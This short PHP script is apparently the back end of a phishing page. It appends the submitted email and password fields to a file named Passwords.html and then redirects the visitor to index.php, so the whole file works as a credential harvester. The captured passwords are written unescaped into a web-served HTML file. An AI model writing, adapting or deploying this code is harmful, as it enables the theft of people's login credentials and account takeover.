<?php
$fp = fopen("Passwords.html", "a");
fwrite($fp, "Email:$_POST[email]\tPassword:$_POST[pass]");
header('Location: index.php');  
?>